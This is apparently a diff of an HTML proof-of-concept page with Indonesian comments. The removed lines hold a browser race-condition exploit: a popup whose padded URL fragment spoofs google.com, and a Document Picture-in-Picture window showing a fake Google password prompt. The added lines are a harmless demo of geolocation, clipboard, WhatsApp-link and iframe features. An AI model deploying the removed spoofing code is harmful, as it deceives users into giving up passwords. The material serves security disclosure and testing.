@@ -1,70 +1,302 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <title>Doc-PiP Race Condition PoC</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-    <script>
-        let step = 0;
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Browser Permission Security PoC</title>
 
-        document.addEventListener('DOMContentLoaded', () => {
-            document.body.addEventListener('click', async () => {
-                step++;
+<style>
+* {
+    box-sizing: border-box;
+}
 
-                if (step === 1) {
-                    // Langkah 1: buka popup about:blank, muat payload spoofing di fragment
-                    const padding = '/'.repeat(300);
-                    const spoofedUrl = 'https://www.google.com/';
-                    const popup = window.open('about:blank#' + padding + spoofedUrl, 'poc', 'width=400,height=400');
+body {
+    margin: 0;
+    padding: 30px 15px;
+    background: #10131a;
+    color: #e8edf5;
+    font-family: Arial, sans-serif;
+}
 
-                    if (!popup) {
-                        document.body.innerHTML = '<h1 style="color:orange;">Popup diblokir</h1>';
-                        return;
-                    }
+.container {
+    max-width: 650px;
+    margin: auto;
+}
 
-                    // Tulis tombol tipuan ke dalam popup
-                    popup.document.body.innerHTML = `
-                        <h1 style="color:#333;">Verifikasi Keamanan</h1>
-                        <button id="pipBtn" style="padding:20px;font-size:18px;">Konfirmasi</button>
-                    `;
+h2 {
+    color: #55d6a3;
+}
 
-                    // Langkah 2: klik tombol, picu PiP, SEGERA navigasi (race condition)
-                    popup.document.getElementById('pipBtn').addEventListener('click', async () => {
-                        try {
-                            // Buka jendela Document PiP
-                            const pipWin = await documentPictureInPicture.requestWindow({
-                                width: 220,
-                                height: 300
-                            });
+.panel {
+    background: #1b2230;
+    border: 1px solid #343e50;
+    border-radius: 12px;
+    padding: 20px;
+    margin: 15px 0;
+}
 
-                            // Tulis formulir phishing ke dalam PiP
-                            pipWin.document.body.innerHTML = `
-                                <h2 style="color:red;">Google</h2>
-                                <p>Verifikasi akun</p>
-                                <input type="password" placeholder="Kata sandi" style="width:100%;">
-                            `;
+button {
+    padding: 12px 16px;
+    border: 0;
+    border-radius: 7px;
+    cursor: pointer;
+    margin: 5px 3px;
+    background: #55d6a3;
+    color: #10131a;
+    font-weight: bold;
+}
 
-                            // ==== Inti race condition ====
-                            // Segera navigasi opener, memanfaatkan jendela waktu observer belum terdaftar (100-500ms)
-                            // Header PiP akan menampilkan google.com (dari payload), bukan URL sebenarnya
-                            window.location.href = 'https://www.google.com';
-                            // ============================
+button.secondary {
+    background: #64748b;
+    color: white;
+}
 
-                        } catch (e) {
-                            popup.document.body.innerHTML = 
-                                `<h1 style="color:gray;">PiP gagal: ${e.message}</h1>`;
-                        }
-                    });
-                }
-            });
-        });
-    </script>
+button.danger {
+    background: #e56b6f;
+    color: white;
+}
+
+.status {
+    background: #101722;
+    padding: 12px;
+    border-radius: 7px;
+    margin-top: 10px;
+    white-space: pre-wrap;
+    overflow-wrap: anywhere;
+}
+
+iframe {
+    width: 100%;
+    height: 35px;
+    border: 1px solid #343e50;
+    margin-top: 5px;
+}
+
+small {
+    color: #9aa9bc;
+}
+</style>
 </head>
-<body style="margin:0;padding:0;">
-    <br><br><br>
-    <center>
-        <h1>Ketuk di mana saja untuk memulai</h1>
-        <p style="color:#666;">Klik 1: buka popup · Klik 2: picu PiP + race condition</p>
-    </center>
+
+<body>
+
+<div class="container">
+
+<h2>Browser Permission Security PoC</h2>
+<p>Geolocation · Clipboard · Navigation · Iframe Lifecycle</p>
+
+<div class="panel">
+    <h3>1. Geolocation Permission</h3>
+    <p>Uji permintaan izin lokasi browser.</p>
+
+    <button onclick="requestLocation()">
+        Request Location
+    </button>
+
+    <div id="locationStatus" class="status">
+        Waiting for permission...
+    </div>
+</div>
+
+<div class="panel">
+    <h3>2. WhatsApp Redirect</h3>
+    <p>Siapkan pesan berdasarkan lokasi yang diberikan browser.</p>
+
+    <button onclick="openWhatsApp()">
+        Open WhatsApp
+    </button>
+
+    <div id="waStatus" class="status">
+        No message prepared.
+    </div>
+</div>
+
+<div class="panel">
+    <h3>3. Clipboard Permission</h3>
+    <p>Uji penyalinan pesan ke clipboard.</p>
+
+    <button onclick="copyMessage()">
+        Copy Message
+    </button>
+
+    <div id="clipboardStatus" class="status">
+        Waiting for clipboard test...
+    </div>
+</div>
+
+<div class="panel">
+    <h3>4. Iframe Lifecycle Test</h3>
+
+    <p>
+        Simulasi pembuatan iframe dengan jumlah terbatas.
+    </p>
+
+    <button onclick="startFrames()">
+        Start Iframe Test
+    </button>
+
+    <button class="danger" onclick="stopFrames()">
+        Stop / Clear
+    </button>
+
+    <div id="frameStatus" class="status">
+        Frames: 0
+    </div>
+
+    <div id="frameContainer"></div>
+</div>
+
+</div>
+
+<script>
+let coordinates = null;
+let preparedMessage = "";
+let frameTimer = null;
+let frameCount = 0;
+
+function requestLocation() {
+    const status =
+        document.getElementById("locationStatus");
+
+    if (!navigator.geolocation) {
+        status.textContent =
+            "Geolocation is not supported.";
+        return;
+    }
+
+    status.textContent =
+        "Waiting for browser permission...";
+
+    navigator.geolocation.getCurrentPosition(
+        position => {
+            coordinates = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
+
+            preparedMessage =
+                "Security PoC Location Test\n" +
+                "Latitude: " + coordinates.latitude +
+                "\nLongitude: " + coordinates.longitude +
+                "\nMaps: https://maps.google.com/?q=" +
+                coordinates.latitude + "," +
+                coordinates.longitude;
+
+            status.textContent =
+                "Location permission granted.\n\n" +
+                "Latitude: " + coordinates.latitude +
+                "\nLongitude: " + coordinates.longitude;
+        },
+
+        error => {
+            status.textContent =
+                "Location request failed: " +
+                error.message;
+        },
+
+        {
+            enableHighAccuracy: false,
+            timeout: 10000,
+            maximumAge: 0
+        }
+    );
+}
+
+function openWhatsApp() {
+    const status =
+        document.getElementById("waStatus");
+
+    if (!coordinates) {
+        status.textContent =
+            "Request location first.";
+        return;
+    }
+
+    const url =
+        "https://wa.me/?text=" +
+        encodeURIComponent(preparedMessage);
+
+    status.textContent =
+        "Opening WhatsApp with prepared message.";
+
+    window.open(url, "_blank", "noopener");
+}
+
+async function copyMessage() {
+    const status =
+        document.getElementById("clipboardStatus");
+
+    if (!preparedMessage) {
+        status.textContent =
+            "Request location first.";
+        return;
+    }
+
+    try {
+        await navigator.clipboard.writeText(
+            preparedMessage
+        );
+
+        status.textContent =
+            "Message copied successfully.";
+    } catch (error) {
+        status.textContent =
+            "Clipboard operation failed: " +
+            error.message;
+    }
+}
+
+function startFrames() {
+    const status =
+        document.getElementById("frameStatus");
+
+    if (frameTimer) return;
+
+    const container =
+        document.getElementById("frameContainer");
+
+    frameTimer = setInterval(() => {
+        if (frameCount >= 10) {
+            stopFrames();
+            status.textContent =
+                "Test completed. Frames: " + frameCount;
+            return;
+        }
+
+        const frame =
+            document.createElement("iframe");
+
+        frame.title = "Controlled lifecycle test";
+
+        frame.srcdoc =
+            "<!DOCTYPE html><html><body>" +
+            "<p>Iframe lifecycle test</p>" +
+            "</body></html>";
+
+        container.appendChild(frame);
+        frameCount++;
+
+        status.textContent =
+            "Active frames: " + frameCount;
+    }, 500);
+}
+
+function stopFrames() {
+    clearInterval(frameTimer);
+    frameTimer = null;
+
+    document.getElementById(
+        "frameContainer"
+    ).replaceChildren();
+
+    frameCount = 0;
+
+    document.getElementById(
+        "frameStatus"
+    ).textContent = "Frames cleared: 0";
+}
+</script>
+
 </body>
 </html>
